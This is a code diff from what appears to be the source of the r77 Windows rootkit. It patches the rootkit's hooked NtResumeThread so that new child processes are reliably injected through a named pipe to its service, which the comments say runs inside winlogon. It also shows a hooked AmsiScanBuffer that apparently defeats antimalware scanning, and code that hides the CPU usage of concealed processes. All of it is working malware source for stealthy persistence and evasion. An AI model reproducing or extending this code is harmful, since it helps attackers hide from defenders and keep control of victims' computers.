@@ -221,16 +221,27 @@ static NTSTATUS NTAPI HookedNtResumeThread(HANDLE thread, PULONG suspendCount)
 		HANDLE pipe = CreateFileW(CHILD_PROCESS_PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 		if (pipe != INVALID_HANDLE_VALUE)
 		{
-			// Send the process ID to the r77 service.
-			DWORD bytesWritten;
-			WriteFile(pipe, &processId, sizeof(DWORD), &bytesWritten, NULL);
+			WRITE_CHILD_PROCESS_PIPET_HREAD_PARAMETERS parameters;
+			parameters.PipeHandle = pipe;
+			parameters.ProcessId = processId;
 
-			// Wait for the response. NtResumeThread should be called after r77 is injected.
-			BYTE returnValue;
-			DWORD bytesRead;
-			ReadFile(pipe, &returnValue, sizeof(BYTE), &bytesRead, NULL);
+			// In some cases, the WriteFile call to the named pipe hangs indefinitely.
+			// This bug was introduced after injecting the r77 service into winlogon, rather than in a hollowed process.
 
-			CloseHandle(pipe);
+			// Therefore, we must execute this write operation in a separate thread.
+			// If this thread does not return within a given amount of time, we must assume that it failed,
+			// and just continue process initialization. The periodic process injection will catch this process
+			// within less than 100ms.
+
+			HANDLE thread = CreateThread(NULL, 0, WriteChildProcessPipeThread, &parameters, 0, NULL);
+			if (thread)
+			{
+				if (WaitForSingleObject(thread, 500) != WAIT_OBJECT_0)
+				{
+					// WriteFile got stuck.
+					TerminateThread(thread, 0);
+				}
+			}
 		}
 	}
 
@@ -639,6 +650,22 @@ static HRESULT WINAPI HookedAmsiScanBuffer(LPVOID amsiContext, LPVOID buffer, UL
 	return 0x80070057;
 }
 
+static DWORD WINAPI WriteChildProcessPipeThread(LPVOID parameter)
+{
+	HANDLE pipe = ((PWRITE_CHILD_PROCESS_PIPET_HREAD_PARAMETERS)parameter)->PipeHandle;
+	DWORD processId = ((PWRITE_CHILD_PROCESS_PIPET_HREAD_PARAMETERS)parameter)->ProcessId;
+
+	// Send the process ID to the r77 service.
+	DWORD bytesWritten;
+	WriteFile(pipe, &processId, sizeof(DWORD), &bytesWritten, NULL);
+
+	// Wait for the response. NtResumeThread should be called after r77 is injected.
+	BYTE returnValue;
+	DWORD bytesRead;
+	ReadFile(pipe, &returnValue, sizeof(BYTE), &bytesRead, NULL);
+
+	CloseHandle(pipe);
+}
 static BOOL GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGER hiddenUserTime, PLONGLONG hiddenCycleTime)
 {
 	// Count hidden CPU usage explicitly instead of waiting for a call to NtQuerySystemInformation(SystemProcessInformation).
